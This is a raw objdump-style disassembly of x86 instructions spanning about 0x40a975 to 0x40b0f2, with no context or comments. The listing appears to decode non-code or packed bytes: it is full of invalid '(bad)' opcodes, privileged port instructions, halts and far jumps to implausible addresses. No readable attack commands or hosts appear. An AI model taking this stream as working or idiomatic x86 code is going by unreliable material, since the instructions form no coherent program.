  40a975:	or     BYTE PTR ds:0x752ff405,bl
  40a97b:	mov    eax,0x27d605ab
  40a980:	sub    eax,0x419a8c3c
  40a985:	cmc    
  40a986:	in     eax,dx
  40a987:	aas    
  40a988:	lods   al,BYTE PTR ds:[esi]
  40a989:	ja     0x40a9a6
  40a98b:	in     al,dx
  40a98c:	mov    ebp,0x8e46f2b2
  40a991:	adc    bl,dh
  40a993:	jmp    0x1bddaee8
  40a998:	xchg   esi,eax
  40a999:	pop    esp
  40a99a:	fisttp QWORD PTR [ebp+0x42c2d9e8]
  40a9a0:	mov    ds:0x16b99461,al
  40a9a5:	xor    al,0xcb
  40a9a7:	shr    DWORD PTR [ecx+eax*1-0x34811f66],0xc0
  40a9af:	(bad)  
  40a9b0:	fcomp  QWORD PTR [ebx]
  40a9b2:	js     0x40a9cc
  40a9b4:	mov    ah,0xb9
  40a9b6:	lods   al,BYTE PTR ds:[esi]
  40a9b7:	or     eax,0xa2e7a337
  40a9bc:	sbb    cl,BYTE PTR [edi+ebx*8+0x625b785f]
  40a9c3:	stos   BYTE PTR es:[edi],al
  40a9c4:	mov    bh,0x80
  40a9c6:	xor    BYTE PTR [ecx-0x39],bl
  40a9c9:	or     ebx,DWORD PTR [esi]
  40a9cb:	lea    eax,ds:0x284561a1
  40a9d1:	push   eax
  40a9d2:	mov    cl,0x82
  40a9d4:	mov    esi,DWORD PTR [edi+0x4fb66a95]
  40a9da:	cmp    al,0x62
  40a9dc:	iret   
  40a9dd:	mov    cl,0xf7
  40a9df:	(bad)  
  40a9e0:	or     ecx,eax
  40a9e2:	jp     0x40a970
  40a9e4:	lods   eax,DWORD PTR ds:[esi]
  40a9e5:	push   ss
  40a9e6:	jne    0x40aa30
  40a9e8:	add    BYTE PTR [eax+ebp*1],al
  40a9eb:	retf   0x33da
  40a9ee:	pop    esp
  40a9ef:	dec    BYTE PTR [edx]
  40a9f1:	pop    esi
  40a9f2:	mov    al,ds:0xba223716
  40a9f7:	push   ebp
  40a9f8:	mov    eax,0x4bd88da0
  40a9fd:	pop    ss
  40a9fe:	fistp  QWORD PTR [edi-0x5bfc0fc6]
  40aa04:	addr16 inc edx
  40aa06:	lods   eax,DWORD PTR ds:[esi]
  40aa07:	cdq    
  40aa08:	or     dh,BYTE PTR [eax+edi*1+0x6f93bd38]
  40aa0f:	(bad)  
  40aa10:	into   
  40aa11:	cmp    cl,BYTE PTR [esi]
  40aa13:	arpl   WORD PTR [ecx+0x0],bp
  40aa16:	pop    es
  40aa17:	cli    
  40aa18:	(bad)  
  40aa19:	ficomp WORD PTR [edi-0x55a301b0]
  40aa1f:	push   eax
  40aa20:	cmp    eax,0x6e3ae39
  40aa25:	xlat   BYTE PTR ds:[ebx]
  40aa26:	lods   al,BYTE PTR ds:[esi]
  40aa27:	call   0x98aef827
  40aa2c:	loope  0x40aa0e
  40aa2e:	pop    ds
  40aa2f:	neg    BYTE PTR [edx+ecx*1+0x67]
  40aa33:	lds    eax,FWORD PTR [edi-0x39]
  40aa36:	adc    eax,0x4b14663c
  40aa3b:	je     0x40aa60
  40aa3d:	ret    
  40aa3e:	test   BYTE PTR [eax],ah
  40aa40:	push   cs
  40aa41:	out    0x59,al
  40aa43:	push   edi
  40aa44:	or     DWORD PTR [esp+ecx*2+0xbbe7b45],0x8fa9ae17
  40aa4f:	or     eax,0x620ba56c
  40aa54:	pusha  
  40aa55:	mov    ds:0xe0c3d96,al
  40aa5a:	cmp    dl,bh
  40aa5c:	push   ebp
  40aa5d:	or     eax,0x4f64aaee
  40aa62:	sbb    dl,BYTE PTR [esi+0x259b2315]
  40aa68:	mov    cl,0x4
  40aa6a:	xor    esi,0xffffff81
  40aa6d:	sbb    ebp,edx
  40aa6f:	jne    0x40aabc
  40aa71:	test   BYTE PTR [ebp-0x9],bh
  40aa74:	or     DWORD PTR [ebx],esi
  40aa76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa77:	mov    ecx,0x1019dfe6
  40aa7c:	mov    ecx,0x22465298
  40aa81:	pop    ebx
  40aa82:	cmp    ah,ch
  40aa84:	jmp    0x40aa3b
  40aa86:	hlt    
  40aa87:	repz and dl,0x36
  40aa8b:	xor    BYTE PTR [edx-0x3],bl
  40aa8e:	cli    
  40aa8f:	idiv   BYTE PTR [edi-0x77c15478]
  40aa95:	call   0x60d68d10
  40aa9a:	into   
  40aa9b:	add    ecx,DWORD PTR es:[edi-0x308a3bd4]
  40aaa2:	loope  0x40ab1f
  40aaa4:	imul   eax,ebx,0xc820ff9f
  40aaaa:	dec    esi
  40aaab:	mov    ch,0xd9
  40aaad:	pop    eax
  40aaae:	fs retf 0x38e6
  40aab2:	jne    0x40aaef
  40aab4:	or     DWORD PTR [ebx-0x148d5ef5],0xffffffaf
  40aabb:	ds jecxz 0x40aa5f
  40aabe:	mov    BYTE PTR [eax+ecx*2+0x7b],ch
  40aac2:	cwde   
  40aac3:	xor    al,0x8b
  40aac5:	inc    edi
  40aac6:	mov    esp,0xfe44c1d8
  40aacb:	push   ds
  40aacc:	pop    ss
  40aacd:	rcl    BYTE PTR ds:0x658f4483,1
  40aad3:	neg    DWORD PTR [esi]
  40aad5:	ror    DWORD PTR [ebx+0x13],0x3e
  40aad9:	pop    eax
  40aada:	rcl    DWORD PTR [esi],0x1
  40aadd:	xlat   BYTE PTR ds:[ebx]
  40aade:	aas    
  40aadf:	dec    ecx
  40aae0:	loopne 0x40aa7c
  40aae2:	or     ebx,DWORD PTR [edx-0x383130c4]
  40aae8:	addr16 push esi
  40aaea:	sbb    esi,ebx
  40aaec:	push   ebp
  40aaed:	mov    ds:0xd6825770,al
  40aaf2:	ret    0xc081
  40aaf5:	xor    al,0xf
  40aaf7:	arpl   bx,bx
  40aaf9:	push   ss
  40aafa:	je     0x40ab51
  40aafc:	icebp  
  40aafd:	push   ss
  40aafe:	adc    al,0xd7
  40ab00:	push   ebx
  40ab01:	jg     0x40aaa1
  40ab03:	pop    ecx
  40ab04:	push   esp
  40ab05:	or     ebx,ebx
  40ab07:	pop    ecx
  40ab08:	xchg   esi,eax
  40ab09:	add    bh,BYTE PTR [edi-0x258a4030]
  40ab0f:	push   ds
  40ab10:	push   edx
  40ab11:	lock jp 0x40ab0d
  40ab14:	jg     0x40ab8e
  40ab16:	test   al,0x49
  40ab18:	and    al,0xd3
  40ab1a:	pop    esi
  40ab1b:	stc    
  40ab1c:	inc    ebp
  40ab1d:	xchg   esi,eax
  40ab1e:	dec    esp
  40ab1f:	push   edi
  40ab20:	loopne 0x40ab48
  40ab22:	xrelease mov BYTE PTR [edx+0x68],bl
  40ab26:	add    BYTE PTR [esp+edx*8-0x52],ah
  40ab2a:	lods   eax,DWORD PTR ds:[esi]
  40ab2b:	clc    
  40ab2c:	sub    bl,ah
  40ab2e:	adc    bl,BYTE PTR [eax+0x18]
  40ab31:	into   
  40ab32:	sub    DWORD PTR [ebx+0x8243064],eax
  40ab38:	out    0xc8,al
  40ab3a:	push   ebx
  40ab3b:	jnp    0x40ab36
  40ab3d:	jne    0x40aafd
  40ab3f:	push   cs
  40ab40:	mov    eax,ds:0x4bff4631
  40ab45:	cld    
  40ab46:	and    al,0x61
  40ab48:	push   es
  40ab49:	push   edi
  40ab4a:	mov    ds:0x9b7ae0f2,eax
  40ab4f:	js     0x40ab8d
  40ab51:	inc    esp
  40ab52:	aam    0xfc
  40ab54:	mov    ch,0x16
  40ab56:	sub    al,0xa
  40ab58:	aaa    
  40ab59:	mov    edx,0x9f5625b1
  40ab5e:	adc    al,0x5a
  40ab60:	fild   QWORD PTR [ebx]
  40ab62:	or     al,0x8
  40ab64:	(bad)  
  40ab65:	xchg   esp,eax
  40ab66:	push   edx
  40ab67:	push   es
  40ab68:	inc    esi
  40ab69:	imul   ebp,DWORD PTR [ebx],0xffffffbd
  40ab6c:	scas   eax,DWORD PTR es:[edi]
  40ab6d:	dec    ebx
  40ab6e:	dec    esp
  40ab6f:	lds    esp,FWORD PTR [esi+0x7810d327]
  40ab75:	mov    dl,0xc0
  40ab77:	sar    edi,0x2
  40ab7a:	add    eax,0x883f975e
  40ab7f:	push   edi
  40ab80:	and    edx,DWORD PTR [ecx+0x71]
  40ab83:	sti    
  40ab84:	(bad)  
  40ab85:	dec    eax
  40ab86:	add    eax,0x32119fc8
  40ab8b:	jnp    0x40abc8
  40ab8d:	xor    DWORD PTR [ebx+0x71aeea6c],esi
  40ab93:	out    0xb5,al
  40ab95:	xor    al,0xb1
  40ab97:	jmp    0x2096:0x18434b23
  40ab9e:	mov    bl,0x5
  40aba0:	pop    esp
  40aba1:	dec    eax
  40aba2:	cdq    
  40aba3:	jecxz  0x40ab48
  40aba5:	inc    eax
  40aba6:	inc    ebx
  40aba7:	shr    DWORD PTR [esp+edx*2-0x26],0x7d
  40abac:	jbe    0x40ac0d
  40abae:	test   al,0xd6
  40abb0:	mov    fs,WORD PTR [eax]
  40abb2:	repz sahf 
  40abb4:	push   edi
  40abb5:	mov    esp,cs
  40abb7:	test   ax,0x7191
  40abbb:	dec    ecx
  40abbc:	cmp    al,0xdd
  40abbe:	in     eax,dx
  40abbf:	cmp    BYTE PTR [ecx],0x7b
  40abc2:	xchg   ebx,eax
  40abc3:	pusha  
  40abc4:	push   edi
  40abc5:	inc    esp
  40abc6:	or     al,0x17
  40abc8:	ffree  st(7)
  40abca:	dec    ebp
  40abcb:	shl    BYTE PTR [ebp-0x17],1
  40abce:	pusha  
  40abcf:	es push eax
  40abd1:	xchg   ebp,eax
  40abd2:	sub    DWORD PTR [edx+0x10530d1c],esp
  40abd8:	pop    esi
  40abd9:	in     eax,dx
  40abda:	pop    esp
  40abdb:	std    
  40abdc:	jge    0x40ab65
  40abde:	sub    al,0x75
  40abe0:	or     bh,BYTE PTR [ebp+0xb]
  40abe3:	sub    al,0x33
  40abe5:	jae    0x40abeb
  40abe7:	out    0x9f,al
  40abe9:	(bad)  
  40abea:	repnz (bad) 
  40abec:	fsubr  st,st(2)
  40abee:	mov    eax,ds:0x19260a9
  40abf3:	lea    edx,[edx+0x1aeff7d9]
  40abf9:	out    dx,eax
  40abfa:	push   ds
  40abfb:	push   0x1ab96fbb
  40ac00:	cs (bad) 
  40ac03:	mov    ebp,0x6a736be9
  40ac08:	dec    esi
  40ac09:	cmp    ebp,DWORD PTR [edi+0x57]
  40ac0c:	retf   
  40ac0d:	loopne 0x40aba1
  40ac0f:	and    eax,DWORD PTR [edx+eax*1]
  40ac12:	inc    bl
  40ac14:	test   eax,0x21fc6e7d
  40ac19:	mov    ds:0x5c127e6c,eax
  40ac1e:	stc    
  40ac1f:	xor    ecx,DWORD PTR [ebx+0x42]
  40ac22:	cmp    BYTE PTR [ebp+0x4ef711e1],bh
  40ac28:	dec    eax
  40ac29:	xchg   BYTE PTR [edi],dh
  40ac2b:	arpl   dx,ax
  40ac2d:	mov    BYTE PTR [eax+0x14782406],ch
  40ac33:	gs inc edx
  40ac35:	mov    ecx,0x83188f12
  40ac3a:	mov    ah,0x1e
  40ac3c:	retf   0x3150
  40ac3f:	lock inc eax
  40ac41:	adc    bl,BYTE PTR ds:0x536e842
  40ac47:	xor    ebp,DWORD PTR [esi]
  40ac49:	dec    esp
  40ac4a:	in     eax,dx
  40ac4b:	mov    ds:0x1184a9f2,eax
  40ac50:	cld    
  40ac51:	push   esi
  40ac52:	and    ebp,edx
  40ac54:	jle    0x40abfc
  40ac56:	pusha  
  40ac57:	pop    eax
  40ac58:	jl     0x40abdb
  40ac5a:	pop    edx
  40ac5b:	loopne 0x40acad
  40ac5d:	clc    
  40ac5e:	jnp    0x40acb6
  40ac60:	nop
  40ac61:	out    dx,al
  40ac62:	stos   BYTE PTR es:[edi],al
  40ac63:	jp     0x40acab
  40ac65:	mov    DWORD PTR [ecx+0x6284429c],eax
  40ac6b:	int    0x61
  40ac6d:	cmp    eax,0xe6284063
  40ac72:	inc    esi
  40ac73:	jp     0x40ac2e
  40ac75:	and    eax,0xb5293a0e
  40ac7a:	es push esi
  40ac7c:	aas    
  40ac7d:	dec    esi
  40ac7e:	iret   
  40ac7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac80:	xchg   edi,eax
  40ac81:	stc    
  40ac82:	or     eax,DWORD PTR [ebp-0x4]
  40ac85:	add    BYTE PTR [esi-0x7ef4bcb0],cl
  40ac8b:	stos   BYTE PTR es:[edi],al
  40ac8c:	and    dh,BYTE PTR [ecx-0x29b147d1]
  40ac92:	mov    edi,0x7b898928
  40ac97:	fstp   DWORD PTR [ecx-0x38e8c8e7]
  40ac9d:	addr16 or ch,ah
  40aca0:	sti    
  40aca1:	xlat   BYTE PTR ds:[ebx]
  40aca2:	jns    0x40ac51
  40aca4:	push   0x5814c771
  40aca9:	stc    
  40acaa:	cmp    BYTE PTR [edx-0x11e5524e],cl
  40acb0:	nop
  40acb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb2:	fs (bad) 
  40acb5:	jae    0x40acee
  40acb7:	aad    0x79
  40acb9:	adc    ch,BYTE PTR [esi-0x1768ca73]
  40acbf:	test   eax,0x133a19a2
  40acc4:	test   eax,0x2a0209d1
  40acc9:	sub    ch,bl
  40accb:	push   0x18ae932f
  40acd0:	mov    bh,0x5a
  40acd2:	mov    bl,0x41
  40acd4:	les    ebx,FWORD PTR [ebx+0x52]
  40acd7:	fs inc edx
  40acd9:	mov    al,0x8c
  40acdb:	mov    ebx,DWORD PTR [ecx]
  40acdd:	mov    bh,0x2
  40acdf:	sti    
  40ace0:	scas   al,BYTE PTR es:[edi]
  40ace1:	lea    edx,[ebp+0x46acfe7b]
  40ace7:	aad    0xf4
  40ace9:	push   ds
  40acea:	adc    al,0x9d
  40acec:	sub    esp,edx
  40acee:	sbb    ecx,esp
  40acf0:	jge    0x40ac9e
  40acf2:	xchg   ecx,eax
  40acf3:	in     eax,dx
  40acf4:	jno    0x40ad3a
  40acf6:	aad    0x44
  40acf8:	test   DWORD PTR [ebp-0x3111ccc5],0x486f4e90
  40ad02:	mov    DWORD PTR [ebx-0x21b41b],ebx
  40ad08:	adc    al,0xc8
  40ad0a:	cmp    DWORD PTR [eax-0x3051a361],ebp
  40ad10:	hlt    
  40ad11:	loope  0x40ad02
  40ad13:	sub    BYTE PTR [edi+0x33],cl
  40ad16:	jecxz  0x40ad7f
  40ad18:	dec    ecx
  40ad19:	mov    ch,0x62
  40ad1b:	test   DWORD PTR [ebp-0x1bcf2b97],edx
  40ad21:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad23:	das    
  40ad24:	jns    0x40ace0
  40ad26:	sbb    esi,ebx
  40ad28:	xor    DWORD PTR [edi+ebp*2-0x5bd0c31f],edi
  40ad2f:	dec    ebx
  40ad30:	cs push 0x1a811db9
  40ad36:	cdq    
  40ad37:	(bad)
  40ad3a:	jge    0x40ad39
  40ad3c:	or     ecx,DWORD PTR [ebx]
  40ad3e:	inc    ebx
  40ad3f:	(bad)  
  40ad40:	mov    ah,0x3f
  40ad42:	bound  ebp,QWORD PTR [esp+ebx*2-0x78]
  40ad46:	fwait
  40ad47:	pop    es
  40ad48:	or     DWORD PTR [esi+0x66],0xffffffe5
  40ad4c:	cdq    
  40ad4d:	les    edx,FWORD PTR [edi+0x7a55b3eb]
  40ad53:	scas   eax,DWORD PTR es:[edi]
  40ad54:	sbb    cl,ah
  40ad56:	dec    esp
  40ad57:	js     0x40ad0c
  40ad59:	scas   al,BYTE PTR es:[edi]
  40ad5a:	test   DWORD PTR [edi],edx
  40ad5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad5d:	aad    0x2c
  40ad5f:	arpl   WORD PTR [eax-0x4],ax
  40ad62:	bts    eax,0xad
  40ad66:	pop    eax
  40ad67:	jns    0x40ad40
  40ad69:	pop    es
  40ad6a:	push   ds
  40ad6b:	mov    DWORD PTR [ebx],edi
  40ad6d:	(bad)  
  40ad6e:	mov    eax,ds:0x4238bb47
  40ad73:	pop    es
  40ad74:	pop    ds
  40ad75:	dec    ebp
  40ad76:	xchg   esp,eax
  40ad77:	pop    esp
  40ad78:	aas    
  40ad79:	jmp    0x4660:0x92fc02c7
  40ad80:	jl     0x40adc3
  40ad82:	cmp    DWORD PTR [edx+0x54],ebx
  40ad85:	mov    bh,0x27
  40ad87:	scas   al,BYTE PTR es:[edi]
  40ad88:	or     BYTE PTR [ecx+0x5b5614ac],bl
  40ad8e:	stos   DWORD PTR es:[edi],eax
  40ad8f:	ins    BYTE PTR es:[edi],dx
  40ad90:	test   DWORD PTR [ecx+eax*2-0x61e5dd21],edi
  40ad97:	jg     0x40ad89
  40ad99:	lods   eax,DWORD PTR ds:[esi]
  40ad9a:	lahf   
  40ad9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9c:	mov    cl,0xb9
  40ad9e:	lock call 0xa260e7a
  40ada4:	xor    cl,bl
  40ada6:	enter  0xd6b6,0xf4
  40adaa:	pop    es
  40adab:	(bad)
  40adae:	sbb    al,0xc0
  40adb0:	ret    
  40adb1:	jecxz  0x40ad8a
  40adb3:	sub    cl,BYTE PTR [edx]
  40adb5:	mov    dh,0x8c
  40adb7:	into   
  40adb8:	jbe    0x40ae04
  40adba:	aas    
  40adbb:	loop   0x40ae32
  40adbd:	leave  
  40adbe:	sbb    edx,edx
  40adc0:	sbb    esp,DWORD PTR [ecx-0x16f94b91]
  40adc6:	or     bl,ah
  40adc8:	add    DWORD PTR [esi],0xea1cc0b0
  40adce:	push   0x94fcffa2
  40add3:	shl    BYTE PTR [ebp+0x7e809615],1
  40add9:	jl     0x40adf1
  40addb:	jne    0x40ad7d
  40addd:	mov    BYTE PTR [ebx],dl
  40addf:	aaa    
  40ade0:	mov    ds,WORD PTR [edx-0x48]
  40ade3:	jge    0x40ad76
  40ade5:	mov    cl,0xfd
  40ade7:	test   BYTE PTR [eax+ecx*1+0x3a],ch
  40adeb:	mov    dh,0xf0
  40aded:	jb     0x40adc9
  40adef:	sub    BYTE PTR [ecx-0x4a],0xec
  40adf3:	(bad)  
  40adf4:	fcom   DWORD PTR [esi]
  40adf6:	xor    eax,DWORD PTR [ecx]
  40adf8:	or     ebp,DWORD PTR [edi-0x6a]
  40adfb:	sbb    bh,dl
  40adfd:	cmp    esp,eax
  40adff:	jge    0x40ae28
  40ae01:	push   ebp
  40ae02:	xlat   BYTE PTR ds:[ebx]
  40ae03:	stos   BYTE PTR es:[edi],al
  40ae04:	xchg   ecx,eax
  40ae05:	add    bl,BYTE PTR [edx]
  40ae07:	rcr    ch,1
  40ae09:	call   0x89d:0x79dceaae
  40ae10:	dec    eax
  40ae11:	jg     0x40adeb
  40ae13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae14:	ror    DWORD PTR [ecx+eiz*4+0x68],cl
  40ae18:	mov    bh,0x2f
  40ae1a:	rol    DWORD PTR [esi+0x7d],0x12
  40ae1e:	(bad)  
  40ae20:	lods   eax,DWORD PTR ds:[esi]
  40ae21:	ins    DWORD PTR es:[edi],dx
  40ae22:	leave  
  40ae23:	or     ebp,edi
  40ae25:	div    BYTE PTR [eax]
  40ae27:	push   0x618a04d8
  40ae2c:	imul   BYTE PTR [ecx+ebp*8+0x46]
  40ae30:	jo     0x40ae27
  40ae32:	shl    DWORD PTR [esi+0x5173938c],0xf4
  40ae39:	sub    ah,BYTE PTR [edi+edi*1]
  40ae3c:	cld    
  40ae3d:	mov    ecx,edi
  40ae3f:	mov    BYTE PTR [esi],dh
  40ae41:	push   ebx
  40ae42:	mov    esp,0xe0635571
  40ae47:	add    DWORD PTR [eax],ebx
  40ae49:	pushf  
  40ae4a:	xchg   edi,eax
  40ae4b:	outs   dx,BYTE PTR ds:[esi]
  40ae4c:	mov    eax,0xd2580a0e
  40ae51:	cmp    ah,bl
  40ae53:	stc    
  40ae54:	iret   
  40ae55:	retf   
  40ae56:	sbb    al,0x77
  40ae58:	enter  0xec11,0x4f
  40ae5c:	sub    ebp,DWORD PTR [esi-0xc7ddcd7]
  40ae62:	push   0xffffffcf
  40ae64:	adc    BYTE PTR [ebx-0x15735747],0xdf
  40ae6b:	mov    edi,0xb515729
  40ae70:	lock push ecx
  40ae72:	in     eax,0xd4
  40ae74:	mov    ecx,0xa8190730
  40ae79:	jno    0x40aeb7
  40ae7b:	dec    esp
  40ae7c:	gs push eax
  40ae7e:	mov    edx,eax
  40ae80:	(bad)  
  40ae81:	enter  0xaf97,0xf5
  40ae85:	daa    
  40ae86:	fsub   DWORD PTR [ecx-0x6f]
  40ae89:	inc    edx
  40ae8a:	push   ss
  40ae8b:	ror    BYTE PTR [ecx-0x389a5503],0x84
  40ae92:	jecxz  0x40ae69
  40ae94:	push   esp
  40ae95:	(bad)  
  40ae96:	cld    
  40ae97:	jbe    0x40af14
  40ae99:	jmp    0x40aee6
  40ae9b:	push   es
  40ae9c:	jae    0x40ae55
  40ae9e:	cdq    
  40ae9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aea0:	push   cs
  40aea1:	cmc    
  40aea2:	scas   eax,DWORD PTR es:[di]
  40aea4:	sub    dl,bh
  40aea6:	(bad)  
  40aea7:	jecxz  0x40ae62
  40aea9:	mov    ebx,0x16c5699
  40aeae:	cmp    esp,DWORD PTR [ecx]
  40aeb0:	push   ebx
  40aeb1:	iret   
  40aeb2:	mov    ch,0x24
  40aeb4:	mov    ch,0xa1
  40aeb6:	in     al,0x84
  40aeb8:	sbb    edi,ebp
  40aeba:	or     BYTE PTR [edi-0x2e],0x18
  40aebe:	hlt    
  40aebf:	push   ebx
  40aec0:	mov    al,BYTE PTR [ebx+0x7a7b73d1]
  40aec6:	lea    ebx,[edi+0x32436ace]
  40aecc:	jb     0x40aed7
  40aece:	and    al,cl
  40aed0:	mov    esp,0xfe32a5d4
  40aed5:	cmc    
  40aed6:	sub    DWORD PTR [edx],eax
  40aed8:	adc    ecx,DWORD PTR [ecx]
  40aeda:	addr16 retf 
  40aedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aedd:	add    ah,dh
  40aedf:	rol    BYTE PTR [ecx+0x481d8304],1
  40aee5:	dec    edx
  40aee6:	push   edx
  40aee7:	outs   dx,BYTE PTR ds:[esi]
  40aee8:	dec    ebp
  40aee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeea:	mov    edi,0x8fb22683
  40aeef:	sub    eax,0xe3f63f7a
  40aef4:	inc    ecx
  40aef5:	mov    BYTE PTR [esi-0x3d3585ee],al
  40aefb:	hlt    
  40aefc:	dec    BYTE PTR [ebx+0x2e]
  40aeff:	push   0x66546ccd
  40af04:	in     al,dx
  40af05:	or     bl,0xa4
  40af08:	fmulp  st(6),st
  40af0a:	loopne 0x40ae8d
  40af0c:	test   al,0xf9
  40af0e:	xchg   edx,eax
  40af0f:	push   eax
  40af10:	jmp    0x343:0xd7d93561
  40af17:	and    eax,0x5f022ec5
  40af1c:	fwait
  40af1d:	psubw  mm5,QWORD PTR [ecx]
  40af20:	or     al,0x70
  40af22:	in     eax,0x72
  40af24:	scas   al,BYTE PTR es:[edi]
  40af25:	jmp    0xd43ee6ee
  40af2a:	xchg   esi,eax
  40af2b:	bt     DWORD PTR [ebx+0x47],0xd4
  40af30:	out    0x57,al
  40af32:	and    dl,BYTE PTR [esi+eax*8+0x6b]
  40af36:	mov    esi,0xb0380fcc
  40af3b:	out    dx,eax
  40af3c:	cmp    al,ah
  40af3e:	dec    eax
  40af3f:	xor    eax,0xd187a01c
  40af44:	mov    ah,0xce
  40af46:	mov    ch,0xf
  40af48:	sti    
  40af49:	ja     0x40aee8
  40af4b:	stos   DWORD PTR es:[edi],eax
  40af4c:	jge    0x40af6a
  40af4e:	out    0x9,al
  40af50:	pop    ebx
  40af51:	lea    ecx,[esi+0x7d]
  40af54:	cmp    al,0xe8
  40af56:	ficom  DWORD PTR ds:0x8392f6cc
  40af5c:	mov    ecx,0x2cb5cf3b
  40af61:	xor    DWORD PTR [eax+0x20],ebp
  40af64:	inc    esp
  40af65:	jo     0x39146fb7
  40af6b:	add    ebx,ebp
  40af6d:	adc    dh,ch
  40af6f:	sub    al,0x59
  40af71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af72:	stos   DWORD PTR es:[edi],eax
  40af73:	or     BYTE PTR [ebp+0x5d],dl
  40af76:	(bad)
  40af79:	sbb    DWORD PTR ds:0x869331b2,edi
  40af7f:	fbld   TBYTE PTR [eax+0x8db978a]
  40af85:	pop    ebx
  40af86:	ds jbe 0x40af20
  40af89:	lock add eax,0xf9bb5951
  40af8f:	mov    dh,0x28
  40af91:	out    dx,al
  40af92:	xchg   edx,eax
  40af93:	and    edi,edx
  40af95:	data16 fld TBYTE PTR [edi+esi*1-0x69e73d39]
  40af9d:	call   0x4e66:0xe52936d5
  40afa4:	pop    ebp
  40afa5:	popa   
  40afa6:	adc    cl,ah
  40afa8:	test   eax,0x1b3d853e
  40afad:	enter  0x68a8,0x85
  40afb1:	jb     0x40b01e
  40afb3:	pop    ebp
  40afb4:	adc    al,0x68
  40afb6:	pop    ds
  40afb7:	sbb    ch,dh
  40afb9:	and    eax,0x358b075e
  40afbe:	xchg   edi,eax
  40afbf:	sbb    al,0xaa
  40afc1:	ds daa 
  40afc3:	xchg   DWORD PTR [edi],esi
  40afc5:	pop    ebp
  40afc6:	rol    DWORD PTR ds:0x13efc9ab,cl
  40afcc:	pop    ebx
  40afcd:	add    esi,DWORD PTR [esi+0x129e652e]
  40afd3:	daa    
  40afd4:	bnd jle 0x40af5d
  40afd7:	lea    ebx,[ebp+0x25]
  40afda:	dec    ecx
  40afdb:	mov    eax,ds:0x14f4063c
  40afe0:	imul   edx,DWORD PTR [edx-0x7f],0xdb78d628
  40afe7:	test   DWORD PTR [ecx-0x14],edi
  40afea:	icebp  
  40afeb:	fwait
  40afec:	mov    dh,0x6b
  40afee:	mov    ebx,0x198bb859
  40aff3:	arpl   WORD PTR [eax-0x24],dx
  40aff6:	cmp    dl,bl
  40aff8:	mov    dh,0x5f
  40affa:	sbb    BYTE PTR [ecx],al
  40affc:	jp     0x40af89
  40affe:	jmp    0x2820:0xccad4891
  40b005:	xlat   BYTE PTR ds:[ebx]
  40b006:	ret    0x572b
  40b009:	push   esp
  40b00a:	jl     0x40b00e
  40b00c:	dec    edx
  40b00d:	neg    bh
  40b00f:	inc    edi
  40b010:	push   ebx
  40b011:	cmp    DWORD PTR ds:0x919af3c2,edx
  40b017:	or     edi,DWORD PTR [edi]
  40b019:	fsub   DWORD PTR [ebp-0x34105822]
  40b01f:	clc    
  40b020:	rcl    BYTE PTR [ecx-0xda98467],0x1f
  40b027:	ds popf 
  40b029:	inc    esp
  40b02a:	inc    edi
  40b02b:	jno    0x40afce
  40b02d:	fmul   QWORD PTR [ecx+0x19]
  40b030:	and    DWORD PTR [ecx+0xe66e8ff],esi
  40b036:	mov    bh,0xbf
  40b038:	adc    ah,ch
  40b03a:	lds    edi,FWORD PTR [eax]
  40b03c:	xlat   BYTE PTR ds:[ebx]
  40b03d:	daa    
  40b03e:	and    edx,DWORD PTR [ebx-0x4748cc9]
  40b044:	push   ds
  40b045:	shl    DWORD PTR [edi-0x1b4abafe],1
  40b04b:	hlt    
  40b04c:	cmp    esi,DWORD PTR [esi]
  40b04e:	and    al,0x68
  40b050:	in     eax,0xe6
  40b052:	(bad)  
  40b053:	sbb    edi,DWORD PTR [edx-0x11]
  40b056:	(bad)  
  40b057:	sti    
  40b058:	cdq    
  40b059:	stos   BYTE PTR es:[edi],al
  40b05a:	mov    ebp,0x23aa4cd8
  40b05f:	xor    ebp,DWORD PTR [ebx+0x7]
  40b062:	pop    ecx
  40b063:	ins    BYTE PTR es:[edi],dx
  40b064:	jecxz  0x40b03c
  40b066:	out    0xa0,eax
  40b068:	loop   0x40b090
  40b06a:	sbb    ebp,edi
  40b06c:	pop    ebx
  40b06d:	sbb    eax,0x810d1693
  40b072:	ror    DWORD PTR ds:0x6085c2d2,cl
  40b078:	bound  edi,QWORD PTR [esi]
  40b07a:	inc    ebx
  40b07b:	ja     0x40b064
  40b07d:	jb     0x40b074
  40b07f:	adc    eax,0xebdb4004
  40b084:	jmp    0x2f0b:0x2fabdaa1
  40b08b:	loop   0x40b109
  40b08d:	dec    eax
  40b08e:	dec    eax
  40b08f:	stos   DWORD PTR es:[edi],eax
  40b090:	daa    
  40b091:	out    0x1,al
  40b093:	ror    DWORD PTR [esi-0x3cd3b0f6],cl
  40b099:	(bad)  [edx+0xafb9bd1]
  40b09f:	lahf   
  40b0a0:	ror    DWORD PTR [eax+0xb14895b],0x45
  40b0a7:	add    edi,DWORD PTR [esi+0x66]
  40b0aa:	dec    eax
  40b0ab:	pop    esi
  40b0ac:	lea    bx,[edi+ebx*8]
  40b0b0:	dec    bp
  40b0b2:	loop   0x40b0d5
  40b0b4:	jnp    0x40b0e0
  40b0b6:	add    al,0xbf
  40b0b8:	push   0xf
  40b0ba:	inc    esi
  40b0bb:	enter  0x2423,0x2b
  40b0bf:	inc    ecx
  40b0c0:	gs adc al,0x1e
  40b0c3:	rcr    BYTE PTR ds:0xa527ee85,cl
  40b0c9:	imul   ecx,eax,0x12
  40b0cc:	retf   
  40b0cd:	xchg   edx,eax
  40b0ce:	imul   edx,DWORD PTR ds:0x7669ff7a,0xb2e270f2
  40b0d8:	pushf  
  40b0d9:	fs xor DWORD PTR fs:[eax],ebx
  40b0dd:	(bad)  
  40b0de:	ret    0x353
  40b0e1:	adc    eax,0x68733bf3
  40b0e6:	mov    esi,DWORD PTR [ebx-0x3f447e1]
  40b0ec:	mov    esp,0x43a123b1
  40b0f1:	inc    esp
  40b0f2:	fst    DWORD PTR [edi]
